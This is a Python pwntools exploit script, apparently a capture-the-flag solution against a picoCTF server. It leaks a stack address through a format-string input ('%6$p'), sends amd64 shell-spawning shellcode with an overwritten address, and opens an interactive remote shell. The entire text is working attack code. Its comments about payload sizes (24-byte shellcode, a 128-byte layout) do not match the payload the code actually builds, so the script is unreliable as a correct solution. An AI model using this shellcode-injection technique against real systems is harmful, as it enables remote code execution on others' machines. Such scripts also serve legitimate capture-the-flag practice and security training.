from pwn import *
context.arch = 'amd64'
context.os = 'linux'

p = remote('wily-courier.picoctf.net', 51768)

# Leak position 6
p.sendline(b'%6$p')
leaked = int(p.recvline().strip(), 16)
address = leaked - 0x158
log.info(f"dest address: {hex(address)}")

# Exactly 24 bytes, no nulls
shellcode = asm(shellcraft.amd64.sh())

# 20 + 24 + 76 + 8 = 128 bytes total
payload = shellcode + p64(address)

log.info(f"payload length: {len(payload)}")

p.sendline(payload)
p.interactive()
